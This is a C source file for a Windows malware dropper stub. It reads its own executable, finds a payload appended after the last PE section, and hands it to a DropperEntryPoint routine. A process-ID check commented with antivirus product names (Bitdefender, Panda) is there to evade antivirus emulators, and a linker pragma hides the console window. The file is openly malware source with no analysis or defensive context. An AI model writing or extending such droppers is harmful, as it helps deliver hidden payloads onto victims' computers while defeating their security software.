#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include "DropperCode.h"
#include "DropperHeader.h"

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

DropperHeader *GetEofData(LPVOID FileBuffer)
{

	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;

	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ImageDosHeader + ImageDosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER ImageSectionHeader = (PIMAGE_SECTION_HEADER)
		((PBYTE)&ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader);

	PBYTE EofData = (PBYTE)ImageDosHeader 
		+ ImageSectionHeader[ImageNtHeaders->FileHeader.NumberOfSections - 1].PointerToRawData 
		+ ImageSectionHeader[ImageNtHeaders->FileHeader.NumberOfSections - 1].SizeOfRawData;

	return (DropperHeader *)EofData;
}

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       nCmdShow)
{
	LPWSTR MyFileName = (LPWSTR)malloc(32768);
	GetModuleFileName(NULL, MyFileName, 32768);

	
	if (GetCurrentProcessId() == 4) // bitdefender && panda && ...
		MessageBox(NULL, L"Program is loading", L"Program is loading", 0);


	HANDLE MyFileHandle = CreateFile(MyFileName,
		GENERIC_READ,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	DWORD MyFileSize = GetFileSize(MyFileHandle, NULL);
	LPVOID MyFileBuffer = malloc(MyFileSize);
	DWORD out;

	ReadFile(MyFileHandle,
		MyFileBuffer,
		MyFileSize,
		&out,
		NULL);
	CloseHandle(MyFileHandle);
	
	DropperHeader *bu = GetEofData(MyFileBuffer);
	DropperEntryPoint(bu);

	free(MyFileBuffer);
}

